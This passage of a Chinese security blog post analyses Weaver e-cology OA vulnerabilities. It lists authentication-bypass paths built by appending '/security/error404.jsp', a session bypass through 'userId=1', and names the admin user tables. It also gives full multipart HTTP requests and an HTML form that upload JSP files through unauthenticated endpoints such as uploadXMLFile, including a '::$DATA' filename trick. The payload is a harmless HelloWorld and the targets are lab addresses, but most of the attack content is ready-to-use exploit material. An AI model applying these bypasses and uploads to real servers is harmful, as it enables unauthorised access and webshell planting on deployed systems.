<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531171433645.png" alt="image-20210531171433645"></p>
<p>​        再加上我们之前发现的其他绕过SecurityRuleQX20的方法，我们可以通过下面的方式绕过已知的漏洞特征。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/weaver/weaver.common.DownloadServlet/security/error404.jsp</span><br><span class="line">/weaver/weaver.common.DownloadServlet/security/error500.jsp</span><br><span class="line">/weaver/weaver.common.DownloadServlet/classbean/weaver/org/layout/</span><br><span class="line">/weaver/weaver.common.DownloadServlet/weaver/weaver.org.layout.DownloadDeptLayoutServlet</span><br><span class="line">/weaver/weaver.common.DownloadServlet/login/LoginSSO.jsp</span><br><span class="line">/weaver/weaver.common.DownloadServlet/login/LoginSSO2.jsp</span><br></pre></td></tr></table></figure>

<p>​        另外我们知道这种绕过的方式可以让我们调用任意的servlet，能否去调用其他的servlet来造成其他漏洞呢？通过测试，当servlet中没有再去做权限认证时，可以通过绕过登录。servlet中进行权限认证的代码如下。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531172635891.png" alt="image-20210531172635891"></p>
<p>​        所以可以通过搜索包含<code>extends HttpServlet</code>且不包含<code>HrmUserVarify.getUser</code>关键字来找到所有可以绕过权限认证的servlet，再从这些servlet中寻找漏洞。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531194231219.png" alt="image-20210531194231219"></p>
<h5 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weaver.page.style.mobile.StyleImpServlet 可能存在上传漏洞</span><br></pre></td></tr></table></figure>

<p>绕过jsp访问的登录拦截器<code>http://172.22.70.50:9999/page/conf/111.jsp/security/error404.jsp</code></p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210601135009483.png" alt="image-20210601135009483"></p>
<p>​        如果使用<code>weaver.page.style.mobile.StyleImpServlet</code>利用上传，需要上传的文件满足某个条件，否则上传的文件会被删除，当传入的内容不能由XMLConfiguration进行配置时，上传成功后会将我们的文件删除。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210601140117987.png" alt="image-20210601140117987"></p>
<h5 id="绕过JSP访问拦截"><a href="#绕过JSP访问拦截" class="headerlink" title="绕过JSP访问拦截"></a>绕过JSP访问拦截</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.22.70.50:9999&#x2F;mobile&#x2F;browser&#x2F;MobileConfigBrowser.jsp&#x2F;security&#x2F;error404.jsp</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210601141520605.png" alt="image-20210601141520605"></p>
<p><strong>管理员默认所在表单</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM HrmResourceManager  管理员用户表</span><br><span class="line">select * from HrmResource 普通用户表</span><br></pre></td></tr></table></figure>

<h5 id="绕过session权限认证"><a href="#绕过session权限认证" class="headerlink" title="绕过session权限认证"></a>绕过session权限认证</h5><p>​        通过传入的userId获取用户信息，并且设置session属性，那么我们就获取了管理员权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mobilemode&#x2F;showdata.jsp&#x2F;security&#x2F;error404.jsp?userId&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210601144539499.png" alt="image-20210601144539499"></p>
<p>​        实际上，再网上找了好几个泛微9.0的网站，均未利用成功，所以还是得找其他可以获取用户权限的点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;weaver&#x2F;weaver.page.style.StyleImpServlet&#x2F;login&#x2F;LoginSSO2.jsp HTTP&#x2F;1.1</span><br><span class="line">Host: 172.22.70.50:9999</span><br><span class="line">Content-Length: 323</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryTx5TODFsx1o7SRH9</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.77 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: languageidweaver&#x3D;7; ecology_JSessionid&#x3D;aaaFJAZYS2Rrt712Z2RMx; loginidweaver&#x3D;1; loginuuids&#x3D;1; JSESSIONID&#x3D;aaaFJAZYS2Rrt712Z2RMx; ecology_JSessionId&#x3D;aaaFJAZYS2Rrt712Z2RMx; __randcode__&#x3D;763c808e-43e7-4904-b6f7-cd7d248cc6ac</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryTx5TODFsx1o7SRH9</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;type&quot;</span><br><span class="line"></span><br><span class="line">..</span><br><span class="line">------WebKitFormBoundaryTx5TODFsx1o7SRH9</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.jsp::$DATA&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;%out.println(&quot;HelloWorld&quot;);%&gt;</span><br><span class="line">------WebKitFormBoundaryTx5TODFsx1o7SRH9--</span><br></pre></td></tr></table></figure>

<h5 id="上传漏洞2"><a href="#上传漏洞2" class="headerlink" title="上传漏洞2"></a>上传漏洞2</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@POST</span></span><br><span class="line">  <span class="meta">@Path</span>(<span class="string">"uploadxml"</span>)</span><br><span class="line">  <span class="meta">@Consumes</span>(&#123;<span class="string">"multipart/form-data"</span>&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">uploadXMLFile</span><span class="params">(@Context HttpServletRequest var1, @Context HttpServletResponse var2)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">      WeaResultMsg var3 = <span class="keyword">new</span> WeaResultMsg(<span class="keyword">false</span>);</span><br><span class="line">      File var4 = <span class="keyword">new</span> File(var1.getSession().getServletContext().getRealPath(<span class="string">"/temp"</span>));</span><br><span class="line">      DiskFileItemFactory var5 = <span class="keyword">new</span> DiskFileItemFactory(<span class="number">102400</span>, var4);</span><br><span class="line">      ServletFileUpload var6 = <span class="keyword">new</span> ServletFileUpload(var5);</span><br><span class="line">      <span class="keyword">boolean</span> var7 = ServletFileUpload.isMultipartContent(var1);</span><br><span class="line">      var6.setHeaderEncoding(<span class="string">"utf-8"</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          List var8 = var6.parseRequest(var1);</span><br><span class="line">          Iterator var9 = var8.iterator();</span><br><span class="line"></span><br><span class="line">          <span class="keyword">while</span>(var9.hasNext()) &#123;</span><br><span class="line">              FileItem var10 = (FileItem)var9.next();</span><br><span class="line">              logger.error(var10.getFieldName());</span><br><span class="line">              logger.error(var10.getName());</span><br><span class="line">              logger.error(var10.getSize());</span><br><span class="line">              <span class="keyword">if</span> (!var10.isFormField()) &#123;</span><br><span class="line">                  File var11 = <span class="keyword">new</span> File(var1.getSession().getServletContext().getRealPath(<span class="string">"/xml/"</span> + var10.getName()));</span><br><span class="line">                  <span class="keyword">if</span> (!var11.getParentFile().exists()) &#123;</span><br><span class="line">                      var11.getParentFile().mkdirs();</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  <span class="keyword">this</span>.saveFile(var10.getInputStream(), var11);</span><br><span class="line">                  var3.success();</span><br><span class="line">                  var3.put(<span class="string">"path"</span>, <span class="string">"/xml/"</span> + var10.getName());</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (FileUploadException var12) &#123;</span><br><span class="line">          var12.printStackTrace();</span><br><span class="line">          var3.fail(var12.getMessage());</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      logger.error(<span class="string">"ok"</span>);</span><br><span class="line">      <span class="keyword">return</span> var3.toString();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>访问路径<code>/xml/xxx.jsp</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.cloudstore.dev.api.service.ServiceHelp#uploadXMLFile</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;172.20.33.215:9999&#x2F;weaver&#x2F;weaver.common.DownloadServlet&#x2F;security&#x2F;error404.jsp?arg0&#x3D;com.cloudstore.dev.api.service.ServiceHelp&amp;arg1&#x3D;uploadXMLFile&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;div align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">            &lt;fieldset style&#x3D;&quot;width:80%&quot;&gt;</span><br><span class="line">                file:&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;FileItem&quot; &#x2F;&gt;</span><br><span class="line">                    &lt;div&gt;</span><br><span class="line">                        &lt;div align&#x3D;&#39;left&#39;&gt;</span><br><span class="line">                            &lt;input type&#x3D;&#39;submit&#39; value&#x3D;&quot;上传文件&quot;&#x2F;&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line">                    &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>​        当然也可以通过直接访问的方式触发。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">api&#x2F;ec&#x2F;dev&#x2F;help&#x2F;uploadxml</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;api&#x2F;ec&#x2F;dev&#x2F;help&#x2F;uploadxml HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.33.215:9999</span><br><span class="line">Content-Length: 227</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryPRSBSEwwpvi0fMLi</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.77 Safari&#x2F;537.36</span><br><span class="line">Cookie: JSESSIONID&#x3D;aaatkxSkQsdahbSkHRgNx; ecology_JSessionId&#x3D;aaatkxSkQsdahbSkHRgNx; __randcode__&#x3D;c71a1ff3-4550-4e91-b1e2-d4c60f5777b1; loginidweaver&#x3D;1; languageidweaver&#x3D;7; loginuuids&#x3D;1; ecology_JSessionid&#x3D;aaaxEfPpbwXUphTkHRgNx</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryPRSBSEwwpvi0fMLi</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;FileItem&quot;; filename&#x3D;&quot;1.jsp&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;%out.println(&quot;HelloWorld&quot;);%&gt;</span><br><span class="line">------WebKitFormBoundaryPRSBSEwwpvi0fMLi--</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.20.33.215:9999&#x2F;js&#x2F;swfupload&#x2F;upload.jsp&#x2F;security&#x2F;error404.jsp</span><br><span class="line"></span><br><span class="line">weaver.admincenter.homepage.ElementRegisterUpload 有可能存在任意文件上传，需要管理员权限</span><br></pre></td></tr></table></figure>

<h3 id="新版本漏洞挖掘"><a href="#新版本漏洞挖掘" class="headerlink" title="新版本漏洞挖掘"></a>新版本漏洞挖掘</h3><p>​    使用新版本进行测试，发现不存在ctrl等接口，并且无法使用白名单进行权限绕过，但解析的特性还是存在的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weaver&#x2F;weaver.workflow.msg.StartMsgServer&#x2F;security&#x2F;error404.jsp</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210602094020103.png" alt="image-20210602094020103"></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/漏洞分析/">漏洞分析</a>
    </span>
    

    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2021 藏青
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>